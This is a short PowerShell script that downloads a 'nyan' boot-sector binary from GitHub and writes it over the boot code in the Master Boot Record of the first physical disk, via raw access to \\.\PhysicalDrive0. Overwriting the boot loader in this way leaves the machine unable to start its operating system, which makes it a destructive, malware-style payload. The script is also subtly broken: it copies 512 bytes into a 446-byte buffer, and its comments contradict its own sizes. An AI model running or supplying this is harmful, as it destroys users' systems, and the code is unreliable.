# Download raw nyan.mbr binary (512 bytes)
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing

# Read the downloaded file
$bootBytes = [System.IO.File]::ReadAllBytes("$env:TEMP\nyan.mbr")

# Create a 446-byte boot code array
$bootCode446 = New-Object byte[] 446
[Array]::Copy($bootBytes, 0, $bootCode446, 0, $bootBytes.Length)  # copy existing bytes
# remaining bytes (443..445) default to 0x00

# Read existing MBR
$fs = New-Object System.IO.FileStream("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
$sector = New-Object byte[] 512
$fs.Read($sector,0,512) | Out-Null

# Copy padded boot code into MBR
[Array]::Copy($bootCode446, 0, $sector, 0, 446)

# Write back
$fs.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Write($sector,0,512)
$fs.Flush()
$fs.Close()
